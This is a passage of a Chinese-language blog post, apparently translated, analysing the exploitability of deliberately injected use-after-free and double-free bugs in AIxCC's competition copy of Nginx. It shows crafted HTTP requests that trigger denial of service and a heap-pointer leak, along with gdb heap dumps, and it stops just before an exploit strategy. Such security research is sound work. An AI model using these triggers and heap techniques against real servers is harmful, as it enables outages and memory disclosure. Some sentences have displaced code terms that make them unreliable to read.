#  利用 AIxCC Nginx 漏洞：第一部分   
 Ots安全   2025-03-02 07:23  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
这篇博文将分析Nginx AIxCC 中时间安全漏洞的可利用性。  
  
AIxCC是 DARPA 的一项竞赛，旨在使用 AI 查找代码库中的漏洞。参赛者不是在寻找 0day 漏洞，而是故意在现有代码库中添加漏洞。其中之一就是半决赛中的Nginx，该比赛已经结束。  
  
在这篇博文中，我将从不同的角度关注这些增加的漏洞是否可以被利用来造成不仅仅是崩溃的后果。  
  
希望本文能对 Nginx 内部漏洞的利用提供一些帮助，因为几乎没有针对 Nginx 内存损坏漏洞的公开利用。我将分析漏洞 CPV9、CPV11 和 CPV17，详细信息可在官方AIxCC 存储库中找到。  
  
我测试的系统是 Ubuntu 24.04。我将考虑两个分配器：jemalloc 和 ptmalloc。我也测试了 jemalloc，因为它是一个高性能分配器，用于 FreeBSD 等系统。我还将在O3启用优化的情况下进行测试，例如：  
  
```
./configure --with-mail --with-http_v2_module --with-cc-opt='-ggdb -O3' --error-log-path=/tmp/nginx/error.log --http-log-path=/tmp/nginx/access.log --pid-path=/tmp/nginx/nginx.pid
```  
  
  
根据需要将配置命令更改为O3或。O0  
  
总结  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taep0iaiaiclWjJiciaAzbOgKJia63GrVyRZsrjZLE8rw42E1ibAk45MoFeZ64mzyZux9JibPG9Gv0gd8JicKow/640?wx_fmt=png&from=appmsg "")  
  
CPV9：链表节点 UAF  
  
错误分析  
  
CPV9 中的堆 UAF 由官方发布的易受攻击的 blob 触发，由于 UAF 导致 NULL 指针取消引用而导致崩溃。它可被利用吗？我们可以编写不会导致 NULL 取消引用的 HTTP 请求吗？  
  
该漏洞存在于 中的黑名单条目删除中ngx_black_list_remove。黑名单对象由IP指向字符串对象的指针ngx_str_t以及指向prev和next黑名单条目的指针组成，它们以双向链表的形式链接在一起。  
  
```
typedefstructngx_black_list_s {    ngx_str_t         *IP;    ngx_black_list_t  *next;    ngx_black_list_t  *prev;}ngx_black_list_t;
```  
  
  
*ngx_black_list_s结构。  
  
在 中ngx_black_list_remove，遍历链接列表，直到IP找到具有匹配的条目。现在，考虑列表为空的情况，即reader为 NULL：由于访问next中的字段， for 循环中会发生 NULL 取消引用reader = reader->next。  
  
remove_ip这还不是全部。现在，考虑中的参数ngx_black_list_remove与链表的头部匹配的情况。第一个 if 语句的条件将得到满足，并且 中的头节点将被清理并释放ngx_destroy_black_list_link。但是，已删除节点的next和prev字段不会被清除，并且链表的头部不会被更新。因此，黑名单的后续使用将始终从头部开始遍历，头部是一个悬空指针，指向IP指针为 NULL 的节点。悬空指针可在后续的ngx_black_list_insert、ngx_black_list_remove和ngx_is_ip_banned调用中使用，在所有这些情况下，如果 为 NULL，工作进程将因 NULL 指针取消引用而崩溃IP。  
  
```
ngx_int_tngx_black_list_remove(ngx_black_list_t **black_list, u_char remove_ip[]){    ngx_black_list_t *reader;    reader = *black_list;    if (reader && !ngx_strcmp(remove_ip, reader->IP->data)) {        ngx_destroy_black_list_link(reader);        return NGX_OK;    }    for (reader = reader->next; reader && reader->next; reader = reader->next) {        if (!ngx_strcmp(remove_ip, reader->IP->data)) {            ngx_double_link_remove(reader);            ngx_destroy_black_list_link(reader);            return NGX_OK;        }    }    return NGX_ERROR;}
```  
  
  
*ngx_black_list_remove功能。  
  
```
#define ngx_destroy_black_list_link(x) \    ngx_memzero((x)->IP->data, (x)->IP->len); \    ngx_free((x)->IP->data); \    (x)->IP->data = NULL; \    ngx_memzero((x)->IP, sizeof(ngx_str_t)); \    ngx_free((x)->IP); \    (x)->IP = NULL; \    ngx_memzero((x), sizeof(ngx_black_list_t)); \    ngx_free((x)); \    (x) = NULL;
```  
  
  
*ngx_destroy_black_list_link清理节点的宏。  
  
如果我们想利用此漏洞实现比 DoS 更多的效果，那么第一个问题是：我们能否制作不会导致 NULL 取消引用的 HTTP 请求？  
  
ptmalloc，未经优化  
  
在我们释放黑名单头节点后，链表的头仍将指向悬空指针。嗯，在 ptmalloc 中利用这一点会带来一个问题：当节点被释放时，IP将是指向下一个 tcache 块的混乱指针，这不是一个有效的内存地址。调用 和 中的任何一个ngx_is_ip_banned都会ngx_black_list_remove取消ngx_black_list_insert引用IP导致错误。因此，我们需要找到一种方法来将有效地址写入IP，例如与通过 分配的另一个块重叠ngx_alloc（而不是ngx_palloc，它使用 Nginx 中的池分配器）。  
  
```
gef➤ p *(ngx_black_list_t *)0x000058aed058b300$7 = {  IP = 0x58ab5ab5b6ab,  next = 0x4000cf8d198122bd,  prev = 0x0}gef➤ x/10gx 0x000058aed058b300-0x100x58aed058b2f0: 0x0000000000000000  0x00000000000000210x58aed058b300: 0x000058ab5ab5b6ab  0x4000cf8d198122bd0x58aed058b310: 0x0000000000000000  0x0000000000000021
```  
  
  
在使用 CodeQL 后，我找不到一个ngx_alloc调用，其中 (1) 大小参数在区间 (0, 0x18] 内，(2) 内容可以由请求输入部分控制，并且 (3) 在通过悬垂指针访问之前不会再次释放分配的块。第三个要求对于 ptmalloc 是必要的，因为块的前 0x10 个字节用于内联元数据，它与的IP和next字段重叠。如果或指向无效ngx_black_list_t内存，调用访问悬垂指针的任何函数都会导致崩溃。IPnext  
  
好吧，我们可以将悬空指针与另一个黑名单重叠。以下是为新节点分配内存的代码片段。第一个ngx_alloc用于包含IP->data字符串，并将与指向释放的黑名单头的悬空指针重叠。问题是，它insert_ip被验证为有效 IP，因此我们只能写入数字 0-9 和点。这不足以形成有效的内存地址，因此任何后续请求都会因ngx_is_ip_banned尝试访问损坏的头节点而崩溃。呃  
  
```
u_char* new_str = (u_char*)ngx_alloc(size, log); // overlaps with freed [node A]    for (size_t i = 0; i < size; i++) {        new_str[i] = insert_ip[i];    }    new_black_list = (ngx_black_list_t*)ngx_alloc(sizeof(ngx_black_list_t), log); // overlaps with [ A.str ]    new_black_list->IP = (ngx_str_t*)ngx_alloc(sizeof(ngx_str_t), log); // overlaps with [ A.str.data ]    new_black_list->IP->data = new_str;    new_black_list->IP->len = size;    new_black_list->next = NULL;
```  
  
  
*分配黑名单节点。  
  
```
for (; reader; reader = reader->next) {            if (!ngx_strcmp(connection->addr_text.data, reader->IP->data)) {                ngx_close_connection(connection);                return NGX_ERROR;            }    }
```  
  
  
*ngx_is_ip_banned核心逻辑。  
  
```
#definengx_is_valid_ip_char(x) (('0' <= (x) && (x) <= '9') || (x) == '.')
```  
  
  
*字符集限制IP->data  
  
我想：是否存在特定于应用程序的漏洞，例如，可以删除黑名单以有效“破坏”此功能？我们可以将其设置next为零，这样可以有效删除黑名单。但该IP字段将被设置为无效地址……同样是因为我只能写入以零结尾的数字和点（不允许部分覆盖）。  
  
因此我认为这个bug的最大影响就是拒绝服务。  
- ptmalloc，经过优化  
  
使用O3，黑名单节点不会被 memzeroed。但是，由于 tcache 的内联元数据，指向无效内存的问题IP仍然存在。没有合适的堆小工具可以在IPUAF 对象的字段中写入有效的内存地址。  
  
因此我认为该漏洞的最大影响依然是拒绝服务。  
- jemalloc，没有优化  
  
我们这样指向jemalloc：  
  
```
LD_PRELOAD=/usr/local/lib/libjemalloc.so objs/nginx -c /home/roundofthree/challenge-004-nginx-source/cp9/test.conf
```  
  
  
IPjemalloc 不存在字段损坏问题，因为 jemalloc 不内联堆元数据，但IP如果 Nginx 编译时未进行优化，则会被归零。从我们拥有的堆小工具来看，我找不到在 处写入有效内存地址的方法IP。任何重用 UAF 黑名单节点的行为都会导致崩溃。呃  
  
因此我认为该漏洞的最大影响依然是拒绝服务。  
- jemalloc，经过优化  
  
通过优化，IP不会归零，因此 UAF 节点可以重复使用而不会崩溃。IP也会指向释放的内存。  
  
使用此请求触发 UAF 和重新分配，  
  
```
GET/ HTTP/1.1Host: localhost:9999User-Agent: curl/7.81.0Accept: */*Black-List: 111.111.111.111;222.222.222.222;333.333.333.333;White-List: 111.111.111.111;Black-List: 444.444.444.444;
```  
  
  
在删除第一个节点之前，  
  
```
gef➤ p **(ngx_black_list_t **)0x783ffe04ab70$3 = {  IP = 0x783ffe01d060,  next = 0x783ffe0340e0,  prev = 0x0}gef➤ p *(ngx_str_t *)0x783ffe01d060$4 = {  len = 0x10,  data = 0x783ffe01d050 "111.111.111.111"}
```  
  
  
移除第一个节点并插入新节点后，新节点与第一个节点重叠（与 ptmalloc 不同，jemalloc 的大小类为 0x10 和 0x20 字节），但由于 malloc/free 顺序，IP和IP->data指针被交换。它使第一个节点处于有效状态，因此进程不会崩溃。但next和prev指针形成一个圆圈。  
  
```
gef➤ p *(ngx_black_list_t *)0x0000783ffe0340c0$19 = {  IP = 0x783ffe01d050,  next = 0x783ffe0340c0,  prev = 0x783ffe0340c0}gef➤ p *(ngx_str_t *)0x783ffe01d050$16 = {  len = 0x10,  data = 0x783ffe01d060 "444.444.444.444"}
```  
  
  
插入新节点会导致无限遍历。删除节点将返回与之前相同的应用程序状态。我们在这里受到限制，因为我们没有足够的相同大小类的头部小工具。如果我们释放两次对象，第二次释放将导致进程崩溃，因为该IP对象被内存清零。  
  
虽然不是 RCE，但破坏链接列表以触发无限遍历可能比仅仅使进程崩溃更严重，因为无限遍历会占用工作进程。  
  
```
$ nc localhost 8080GET / HTTP/1.1Host: localhost:9999User-Agent: curl/7.81.0Accept: */*
```  
  
  
  
```
Ctrl+C[#0] 0x783ffe98afa0 → __strcmp_avx2()[#1] 0x64fb3d0b5968 → ngx_is_ip_banned(cycle=<optimised out>, connection=0x783ffe08e720)[#2] 0x64fb3d0dd987 → ngx_http_wait_request_handler(rev=0x783ffe0af600)[#3] 0x64fb3d0cdd15 → ngx_epoll_process_events(cycle=0x783ffe04a8d0, timer=<optimised out>, flags=0x1)[#4] 0x64fb3d0c39ca → ngx_process_events_and_timers(cycle=0x783ffe04a8d0)[#5] 0x64fb3d0cbae0 → ngx_worker_process_cycle(cycle=0x783ffe04a8d0, data=0x0)[#6] 0x64fb3d0ca05a → ngx_spawn_process(cycle=0x783ffe04a8d0, proc=0x64fb3d0cba50 <ngx_worker_process_cycle>, data=0x0, name=0x64fb3d1454da "worker process", respawn=0xfffffffffffffffd)[#7] 0x64fb3d0cb428 → ngx_start_worker_processes(cycle=0x783ffe04a8d0, n=0x1, type=0xfffffffffffffffd)[#8] 0x64fb3d0cc716 → ngx_master_process_cycle(cycle=0x783ffe04a8d0)[#9] 0x64fb3d09dec2 → main(argc=<optimised out>, argv=<optimised out>)──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ cContinuing.
```  
  
  
*GDB 显示无限遍历ngx_is_ip_banned  
  
CPV11：UAF 读取  
  
错误分析  
  
CPV11 不会使 Nginx 进程崩溃，即使没有远程管理权限，它也会打印主机规范，因为 UAF 缓冲区包含主机规范。对象分配cycle->host_specs在 中ngx_init_cycle，其字段host_cpu和随后立即初始化：host_memhost_os  
  
```
// [...]    cycle->host_specs->host_cpu = ngx_alloc(sizeof(ngx_str_t), log);    if (cycle->host_specs->host_cpu == NULL) {        ngx_destroy_pool(pool);        returnNULL;    }    cycle->host_specs->host_cpu->data = (u_char*)"Unknown CPU\n";    ngx_memzero(line, NGX_MAX_HOST_SPECS_LINE);    fp = fopen("/proc/cpuinfo", "r");    if (fp != NULL) {        temp_char = NULL;        while (fgets(line, sizeof(line), fp) != NULL) {            if (ngx_strncmp(line, "model name", 10) == 0) {                temp_char = strchr(line, ':');                if (temp_char != NULL) {                    temp_char += 2;                    cycle->host_specs->host_cpu->data = ngx_alloc(sizeof(line), log);                    if (cycle->host_specs->host_cpu->data == NULL) {                        break;                    }                    ngx_memzero(cycle->host_specs->host_cpu->data, sizeof(line));                    cycle->host_specs->host_cpu->len = \                        ngx_sprintf(cycle->host_specs->host_cpu->data, "%s", temp_char) - \                        cycle->host_specs->host_cpu->data;                    break;                }            }        }        fclose(fp);    }    // [...]
```  
  
  
问题是，紧接着，代码会检查我们是否已配置remote_admin，如果没有，它会释放，cycle->host_specs但对已释放对象的引用会保留。  
  
```
ccf = (ngx_core_conf_t *) ngx_get_conf(cycle->conf_ctx, ngx_core_module);    if (!ccf->remote_admin) {        ngx_free(cycle->host_specs);    }
```  
  
  
快速 grep 得出的结论是，对象cycle->host_specs在 中使用ngx_http_get_host_specs（另一个在 中使用ngx_master_process_exit，会拆除）。即使未启用 ，也cycle->host_specs可以取消引用 中的悬空指针以打印主机规范。ngx_http_get_host_specsremote_admin  
  
```
static ngx_int_t ngx_http_get_host_specs(ngx_http_request_t *r,    ngx_http_variable_value_t *v, uintptr_t data){    u_char *temp;    v->data = ngx_pnalloc(r->pool, NGX_MAX_HOST_SPECS_LINE * 3);    if (v->data == NULL) {        return NGX_HTTP_INTERNAL_SERVER_ERROR;    }    ngx_memzero(v->data, NGX_MAX_HOST_SPECS_LINE * 3);    temp = v->data;    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_cpu->data); // NO CHERI crash CPV11 (UAF)    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_mem->data);    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_os->data);    v->len = v->data - temp;    v->data = temp;    return NGX_OK;}
```  
  
  
此处存在漏洞的 UAF 对象是ngx_host_specs_t，它属于 0x20 sizeclass（对象大小为 0x18）。与 CPV9 一样，我们也缺少 0x20 sizeclass 的堆小工具……我唯一知道的小工具是黑名单节点，它是 CPV9 中的漏洞对象。  
- ptmalloc (有和无优化)  
  
从工作进程释放的ngx_host_specs_t对象的前两个字段被清零，而在主线程中则用堆元数据填充。这是因为该ngx_host_specs_t对象是在主进程中释放的，并且主进程在分配的前两个字段中写入了 tcache 键和混乱的下一个指针。  
  
```
gef➤ p *(ngx_host_specs_t *)0x601a05991f40$3 = {  host_cpu = 0x0,  host_mem = 0x0,  host_os = 0x601a05992040}
```  
  
  
*工作进程gdb查看。  
  
```
gef➤ p *(ngx_host_specs_t *)0x601a05991f40$1 = {  host_cpu = 0x601a05991,  host_mem = 0xd213200cf2633c78,  host_os = 0x601a05992040}
```  
  
*掌握进程gdb查看。  
  
由于释放的内存ngx_host_specs_t在主进程的 tcache 中，因此我无法将其与黑名单节点重叠。触发 UAF 读取原语ngx_http_get_host_specs将导致工作进程崩溃，因为取消引用了无效指针而导致DoS 。  
  
```
static ngx_int_t ngx_http_get_host_specs(ngx_http_request_t *r,    ngx_http_variable_value_t *v, uintptr_t data){    u_char *temp;    v->data = ngx_pnalloc(r->pool, NGX_MAX_HOST_SPECS_LINE * 3);    if (v->data == NULL) {        return NGX_HTTP_INTERNAL_SERVER_ERROR;    }    ngx_memzero(v->data, NGX_MAX_HOST_SPECS_LINE * 3);    temp = v->data;    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_cpu->data); // NO CHERI crash CPV11 (UAF)    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_mem->data);    v->data = ngx_sprintf(v->data, "%s", r->cycle->host_specs->host_os->data);    v->len = v->data - temp;    v->data = temp;    return NGX_OK;}
```  
  
- jemalloc (有和无优化)  
  
这是已释放的主机规格对象。  
  
```
gef➤ p *(ngx_host_specs_t*)0x73e067a340a0$2 = {  host_cpu = 0x73e067a1d020,  host_mem = 0x73e067a1d030,  host_os = 0x73e067a1d040}
```  
  
  
然后我们让第一个黑名单节点与释放的主机规范对象重叠。prev仍然是前一个host_os指针，IP是最近分配的ngx_str_t，为了使其next非空，我们至少分配一个黑名单节点。next是一个指向黑名单节点的指针，但我们将其与 重叠host_mem，这是一个ngx_str_t。所以我们分配另一个黑名单节点来填充指向 的指针host_mem->data（与 重叠）。打印主机规范时，我们泄露了第三个节点next->next的地址，这是一个最近分配的堆对象。IP0x73e067a1d0a0  
  
```
gef➤ p *(ngx_black_list_t *)0x73e067a340a0$7 = {  IP = 0x73e067a1d060,next = 0x73e067a340c0,prev = 0x73e067a1d040}gef➤ p *(ngx_black_list_t *)0x73e067a340c0$8 = {  IP = 0x73e067a1d080,next = 0x73e067a340e0,prev = 0x73e067a340a0}gef➤ p *(ngx_black_list_t *)0x73e067a340e0$9 = {  IP = 0x73e067a1d0a0,next = 0x0,prev = 0x73e067a340c0}
```  
  
  
  
```
GET/host_specs HTTP/1.1Host: localhostConnection: CloseBlack-List: 111.111.111.111;222.222.222.222;333.333.333.333;444.444.444.444;HTTP/1.1 200 OKServer: nginx/1.24.0Date: Mon, 17 Feb 2025 17:06:18 GMTContent-Type: text/plainContent-Length: 63Connection: closeHostSpecifications:111.111.111.111�Сg�s"Ubuntu 24.04.1LTS"
```  
  
  
此 UAF 对象只有读取原语...所以我认为我能得到的最大影响是信息泄露（泄漏堆指针）。  
  
CPV17：UAF 要双免吗？  
  
错误分析  
  
在 CPV17 中触发堆 UAF 会记录一个应用程序错误，因为 UAF 对象s->connection已将其write事件对象传递ngx_mail_send给ngx_mail_session_internal_server_error，并且fd相应的s->connection->write已在第一次释放（ ）时关闭ngx_mail_close_connection，因此导致send() failed (9: Bad file descriptor)错误。  
  
```
2025/02/0400:06:22[alert]21598#0: *2send() failed (9: Bad file descriptor) whileinauthstate, client: 127.0.0.1, server: 0.0.0.0:80802025/02/0400:06:22[alert]21598#0: *2connectionalreadyclosedwhileinauthstate, client: 127.0.0.1, server: 0.0.0.0:8080
```  
  
  
*使用官方发布的触发 blob 触发 CPV17 后的 Nginx 日志片段。  
  
根据CPV官方信息，  
  
该函数尝试访问已释放的连接结构，这将导致通过 UAF 崩溃。  
  
但是，它不会触发 jemalloc 崩溃。  
  
那么，到底发生了什么事呢？  
  
ngx_mail_send呼叫ngx_mail_close_connection，因为fd已被清除。  
  
```
voidngx_mail_send(ngx_event_t *wev){    ngx_int_t n;    ngx_connection_t *c;    ngx_mail_session_t *s;    ngx_mail_core_srv_conf_t *cscf;    c = wev->data;    s = c->data;    if (wev->timedout) {        ngx_log_error(NGX_LOG_INFO, c->log, NGX_ETIMEDOUT, "client timed out");        c->timedout = 1;        ngx_mail_close_connection(c);        return;    }    if (s->out.len == 0) {        if (ngx_handle_write_event(c->write, 0) != NGX_OK) {            ngx_mail_close_connection(c);        }        return;    }    n = c->send(c, s->out.data, s->out.len);// [...]    if (n == NGX_ERROR) {        ngx_mail_close_connection(c); // HERE        return;    }// [...]
```  
  
  
ngx_mail_close_connection对同一个连接对象调用两次意味着调用ngx_close_connection和ngx_destroy_pool两次。调用ngx_close_connection没有用，因为它检查fd不为 -1。但是，ngx_destroy_pool对同一个池对象调用两次可能会由于双重释放而破坏内存分配器的内部状态。具体来说，在中ngx_destroy_pool，已注册的清理handler函数被调用，与池相关的大分配被再次释放，池块被再次释放到系统分配器。  
  
```
voidngx_mail_close_connection(ngx_connection_t *c){    ngx_pool_t  *pool;    ngx_log_debug1(NGX_LOG_DEBUG_MAIL, c->log, 0,                   "close mail connection: %d", c->fd);#if (NGX_MAIL_SSL)    if (c->ssl) {        if (ngx_ssl_shutdown(c) == NGX_AGAIN) {            c->ssl->handler = ngx_mail_close_connection;            return;        }    }#endif#if (NGX_STAT_STUB)    (void) ngx_atomic_fetch_add(ngx_stat_active, -1);#endif    c->destroyed = 1;    pool = c->pool;    ngx_close_connection(c);    ngx_destroy_pool(pool); // double free}
```  
  
- ptmalloc (有和无优化)  
  
为什么触发该漏洞会立即导致 ptmalloc 崩溃？  
  
在第二次调用 时，行中的ngx_mail_session_internal_server_error邮件会话对象指向已释放的对象。由于内联元数据，指向与内联 tcache 键对应的无效内存。因此，对于 ptmalloc 来说，触发此错误会导致立即崩溃。sngx_mail_send(s->connection->write);0x5b33b60b0130s->connection  
  
```
gef➤ p s$14 = (ngx_mail_session_t *) 0x5b33b60b0130gef➤ heap bins────────────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────────────────────────────────────Tcachebins[idx=15, size=0x110, count=4] ← Chunk(addr=0x5b33b60f6700, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← Chunk(addr=0x5b33b60b0020, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← Chunk(addr=0x5b33b60b02c0, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← Chunk(addr=0x5b33b60f6810, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Tcachebins[idx=23, size=0x190, count=1] ← Chunk(addr=0x5b33b60b0130, size=0x190, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Tcachebins[idx=28, size=0x1e0, count=1] ← Chunk(addr=0x5b33b60af2c0, size=0x1e0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Tcachebins[idx=63, size=0x410, count=2] ← Chunk(addr=0x5b33b60af520, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← Chunk(addr=0x5b33b60afb10, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)gef➤ p s->connection$15 = (ngx_connection_t *) 0x540bb4cf3bebdbec
```  
  
  
最高影响：DoS。  
- jemalloc (有和无优化)  
  
由于 jemalloc 没有内联元数据，因此在ngx_destroy_pool对同一池对象调用两次之前，工作进程不会崩溃。因此，在触发漏洞后，我们有 4 个双重释放的分配（jemalloc 没有任何双重释放保护）：  
  
1.两次释放 3 个 0x100 字节分配（在以下情况下为0x7caf42ac2200、0x7caf42ac2100和0x7caf42ac2000），对应于链接在一起的三个池块。查看两次返回的三个分配：  
  
```
gef➤ p malloc(0x100)$3 = (void *) 0x7caf42ac2200gef➤ p malloc(0x100)$4 = (void *) 0x7caf42ac2100gef➤ p malloc(0x100)$5 = (void *) 0x7caf42ac2000gef➤ p malloc(0x100)$6 = (void *) 0x7caf42ac2300gef➤ p malloc(0x100)$7 = (void *) 0x7caf42ac2200gef➤ p malloc(0x100)$8 = (void *) 0x7caf42ac2100gef➤ p malloc(0x100)$9 = (void *) 0x7caf42ac2000gef➤ p malloc(0x100)$10 = (void *) 0x7caf42ac2300gef➤ p malloc(0x100)$11 = (void *) 0x7caf42ac2400gef➤ p malloc(0x100)$12 = (void *) 0x7caf42ac2500
```  
  
  
2.双重释放一个 0x1000 字节分配（在以下情况下0x70388d020000），对应于双重释放池中的大池块：  
  
```
gef➤ p malloc(0x1000)$1 = (void *) 0x70388d020000gef➤ p malloc(0x1000)$2 = (void *) 0x70388d020000gef➤ p malloc(0x1000)$3 = (void *) 0x70388d023000gef➤ p malloc(0x1000)$4 = (void *) 0x70388d024000
```  
  
  
我尝试 1) 触发漏洞和 2) 发送一个简单的 HTTP GET 请求。结果是，当尝试从损坏的池中进行分配时，进程崩溃了。这是因为 0x1000 分配既用作连接池，又用作下一个池块（观察到指向d.next自身）。因此，从第二个池块分配的项目会破坏第一个池块中的项目。在这种情况下，r->headers_in.headers与第一个池块中的元数据重叠，留下current一个无效地址。这会导致任何后续池分配崩溃……  
  
```
gef➤ p *(ngx_pool_t*)0x70388d020000 $14 = {  d = {    last = 0x70388d020480 "P\254\004\2158p",    end = 0x70388d021000 "\t",    next = 0x70388d020000,    failed = 0x0  },  max = 0x30f5a8,  current = 0x4,  chain = 0x70388d03500f,  large = 0x9,  cleanup = 0x70388d035015,  log = 0x70388d01e060}
```  
  
  
到底是什么破坏了池元数据？我们如何避免破坏池元数据？在 中ngx_http_process_request_line，从双重释放的池中分配一个大小为 的列表20 * sizeof(ngx_table_elt_t) = 0x460。这会触发第二个池块分配。  
  
```
if (ngx_list_init(&r->headers_in.headers, r->pool, 20,                              sizeof(ngx_table_elt_t))                != NGX_OK)            {                ngx_http_close_request(r, NGX_HTTP_INTERNAL_SERVER_ERROR);                break;            }
```  
  
  
在中ngx_http_process_request_headers，对于每个成功解析的标题行，ngx_list_push从第二个池块分配内存，覆盖重叠的池块元数据。  
  
```
/* a header line has been parsed successfully */            h = ngx_list_push(&r->headers_in.headers);            if (h == NULL) {                ngx_http_close_request(r, NGX_HTTP_INTERNAL_SERVER_ERROR);                break;            }            h->hash = r->header_hash;            h->key.len = r->header_name_end - r->header_name_start; // overlaps with `current`            h->key.data = r->header_name_start;            h->key.data[h->key.len] = '\0';            h->value.len = r->header_end - r->header_start;            h->value.data = r->header_start;            h->value.data[h->value.len] = '\0';            h->lowcase_key = ngx_pnalloc(r->pool, h->key.len); // crash due to the corruption above
```  
  
  
我们如何避免破坏池块元数据？当我们处理成功解析的标头行时，该过程就会崩溃。因此，我们必须避免处理有效的标头，或者在处理任何标头之前控制流程。我做了很多尝试，但我将重点介绍两种方法。  
  
尝试 1：使用记录器  
  
pool+0x20我认为，我可以利用日志处理程序从池中分配缓冲区这一事实来写入部分受控的内容：  
  
```
[#0] 0x5a4dfc6ade3e → ngx_http_log_body_bytes_sent(r=0x711c2b220050, buf=0x711c2b220452 "", op=0x711c2b24df58)[#1] 0x5a4dfc6acc32 → ngx_http_log_handler(r=0x711c2b220050)[#2] 0x5a4dfc6a7e1a → ngx_http_log_request(r=0x711c2b220050)[#3] 0x5a4dfc6a7c67 → ngx_http_free_request(r=0x711c2b220050, rc=0x0)[#4] 0x5a4dfc6a7b24 → ngx_http_close_request(r=0x711c2b220050, rc=0x0)[#5] 0x5a4dfc6a765e → ngx_http_lingering_close_handler(rev=0x711c2b2a0e80)[#6] 0x5a4dfc681068 → ngx_event_expire_timers()[#7] 0x5a4dfc67ec08 → ngx_process_events_and_timers(cycle=0x711c2b24a4d0)[#8] 0x5a4dfc68cfc7 → ngx_worker_process_cycle(cycle=0x711c2b24a4d0, data=0x0)[#9] 0x5a4dfc689a91 → ngx_spawn_process(cycle=0x711c2b24a4d0, proc=0x5a4dfc68cf0b <ngx_worker_process_cycle>, data=0x0, name=0x5a4dfc74d887 "worker process", respawn=0x0)
```  
  
  
  
```
gef➤ tele 0x711c2b2200000x0000711c2b220000│+0x0000: 0x0000711c2b220480 → 0x0000711c2b24a4d0 → 0x0000711c2b24b780 → 0x0000711c2b24c370 → 0x00000000000000010x0000711c2b220008│+0x0008: 0x0000711c2b221000 → 0x0000000000000009 ("\t"?)0x0000711c2b220010│+0x0010: 0x0000711c2b220000 → 0x0000711c2b220480 → 0x0000711c2b24a4d0 → 0x0000711c2b24b780 → 0x0000711c2b24c370 → 0x00000000000000010x0000711c2b220018│+0x0018: 0x00000000000000000x0000711c2b220020│+0x0020: "127.0.0.1 - - [19/Feb/2025:19:18:21 +0000] "aGET /[...]"0x0000711c2b220028│+0x0028: "1 - - [19/Feb/2025:19:18:21 +0000] "aGET /very/lon[...]"0x0000711c2b220030│+0x0030: "9/Feb/2025:19:18:21 +0000] "aGET /very/long/path/t[...]"0x0000711c2b220038│+0x0038: "25:19:18:21 +0000] "aGET /very/long/path/that/keep[...]"0x0000711c2b220040│+0x0040: ":21 +0000] "aGET /very/long/path/that/keeps/going/[...]"0x0000711c2b220048│+0x0048: "0] "aGET /very/long/path/that/keeps/going/on/and/o[...]"
```  
  
  
但有一个问题：我们不能写入 NULL 字节和不可打印字符。这就是发生的事情：这些字符被清理了。  
  
```
gef➤ tele r->pool0x00007b7aa7e20000│+0x0000: 0x00007b7aa7e2009d → 0x7555de17f0000061 ("a"?)0x00007b7aa7e20008│+0x0008: 0x00007b7aa7e21000 → 0x0000000000000009 ("\t"?)0x00007b7aa7e20010│+0x0010: 0x00007b7aa7e20000 → 0x00007b7aa7e2009d → 0x7555de17f0000061 ("a"?)0x00007b7aa7e20018│+0x0018: 0x00000000000000000x00007b7aa7e20020│+0x0020: "127.0.0.1 - - [01/Mar/2025:16:29:13 +0000] "7\x13\[...]" ← $rsi0x00007b7aa7e20028│+0x0028: "1 - - [01/Mar/2025:16:29:13 +0000] "7\x13\x00\x00\[...]"0x00007b7aa7e20030│+0x0030: "1/Mar/2025:16:29:13 +0000] "7\x13\x00\x00\x00\x00\[...]"0x00007b7aa7e20038│+0x0038: 0x39323a36313a35320x00007b7aa7e20040│+0x0040: 0x3030302b2033313a0x00007b7aa7e20048│+0x0048: 0x31785c3722205d30
```  
  
  
那是一条死路。:(  
  
尝试 2：分配较大的标头缓冲区  
  
我们再分析一下情况。HTTP 请求由请求行和请求头组成。请求行首先在 中进行解析和处理ngx_http_process_request_line。  
  
如果请求行无效，Nginx 将以 结束请求NGX_HTTP_BAD_REQUEST，并因日志缓冲区与请求对象重叠而导致崩溃r。  
  
如果请求行有效r->headers_in.headers，则从请求池分配输入标头列表r->pool，然后在中处理标头ngx_http_process_request_headers。分配输入标头列表会导致池分配器分配另一个池块来满足请求，并且由于双重释放，获得的池块与重叠r->pool。然后在中ngx_http_process_request_headers，标头被逐一解析和处理。处理第一个有效标头的结果r->pool是被破坏，并且工作进程崩溃，因为ngx_pnalloc在破坏池元数据后立即被调用。如果我们不发送任何有效标头来避免这次崩溃，该怎么办？如果我们不发送任何标头，则不会发生任何有用的事情：请求已完成，并且在崩溃之前我们的输入不会与任何有用的东西重叠。如果我们发送一个无效的标头，请求将以终止NGX_HTTP_BAD_REQUEST。  
  
这似乎是一条死路。我注意到 Nginx 将输入读取到大小为 0x400 的缓冲区（client_header_buffer_size），但如果请求行或标头超出此限制，large_client_header_buffers则会分配一个大小为 的大缓冲区。如果我们分配一个与 重叠的大缓冲区会怎么样r->pool？  
  
但是大缓冲区大小默认设置为 8k...让我们通过设置将缓冲区大小设置为 4k large_client_header_buffers 4 4096;，这是一个完全合理的配置（请参阅示例配置：https://nginx.org/en/docs/example.html）。  
  
漏洞利用策略如下：  
